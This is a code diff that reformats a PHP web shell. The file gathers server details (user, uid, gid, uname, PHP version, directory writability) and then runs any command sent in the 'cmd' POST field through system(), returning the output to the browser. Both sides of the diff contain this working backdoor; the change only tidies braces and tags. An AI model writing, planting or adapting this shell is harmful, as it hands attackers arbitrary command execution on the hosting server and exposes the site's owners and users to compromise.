@@ -4,22 +4,26 @@ echo "<p><font size=2 face=Verdana><b>This Is The Server Information</b></font><
 ?>
 
 <?php
-  closelog( );
-  $user = get_current_user( );
-  $login = posix_getuid( );
-  $euid = posix_geteuid( );
-  $ver = phpversion( );
-  $gid = posix_getgid( );
-  if ($chdir == "") $chdir = getcwd( );
-  if(!$whoami)$whoami=exec("whoami");
+  closelog();
+  $user = get_current_user();
+  $login = posix_getuid();
+  $euid = posix_geteuid();
+  $ver = phpversion();
+  $gid = posix_getgid();
+  if ($chdir == "") {
+      $chdir = getcwd();
+  }
+  if (!$whoami) {
+      $whoami=exec("whoami");
+  }
 ?>
 <meta name="generator" content="Namo WebEditor v5.0">
 <br>
 <TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0">
 <?php
-  $uname = posix_uname( );
-  while (list($info, $value) = each ($uname)) {
-?>
+  $uname = posix_uname();
+  while (list($info, $value) = each($uname)) {
+      ?>
   <TR>
     <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><?= $info ?>: <?= $value ?></DIV></TD>
   </TR>
@@ -35,7 +39,11 @@ echo "<p><font size=2 face=Verdana><b>This Is The Server Information</b></font><
 
   </TR>
   <TR>
-  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Permission Directory:</b> <? if(@is_writable($chdir)){ echo "Yes"; }else{ echo "No"; } ?></DIV></TD>
+  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Permission Directory:</b> <?php if (@is_writable($chdir)) {
+    echo "Yes";
+} else {
+    echo "No";
+} ?></DIV></TD>
   </TR>  
   <TR>
   <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Server Services:</b> <?= "$SERVER_SOFTWARE $SERVER_VERSION"; ?></DIV></TD>
@@ -65,14 +73,18 @@ echo "<p><font size=2 face=Verdana><b>This Is The Server Information</b></font><
 <hr color=777777 width=100% height=115px>
 
 <pre>
-<?
+<?php
 $cmd = $_POST['cmd'];
-  if (isset($chdir)) @chdir($chdir);
+  if (isset($chdir)) {
+      @chdir($chdir);
+  }
   ob_start();
   system("$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp");
   $output = ob_get_contents();
   ob_end_clean();
-  if (!empty($output)) echo str_replace(">", "&gt;", str_replace("<", "&lt;", $output));
+  if (!empty($output)) {
+      echo str_replace(">", "&gt;", str_replace("<", "&lt;", $output));
+  }
 exit;
 ?>
 </pre>
